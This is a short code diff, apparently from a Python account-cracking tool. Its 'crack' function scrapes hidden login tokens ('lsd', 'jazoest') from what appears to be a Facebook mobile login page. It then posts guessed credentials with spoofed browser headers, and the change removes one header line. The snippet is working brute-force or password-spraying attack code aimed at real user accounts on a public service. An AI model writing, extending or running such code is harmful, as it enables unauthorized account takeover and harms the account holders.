@@ -654,7 +654,6 @@ def crack(idf,pwx,url,awal):
 			link = ses.get(f'https://{url}/login/?source=auth_switcher')
 			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
 			hd2 = {"Host":url,
-				"upgrade-insecure-requests":"1",
 				"user-agent":ua,
 				"accept":"*/*",
 				"content-type":"application/x-www-form-urlencoded",
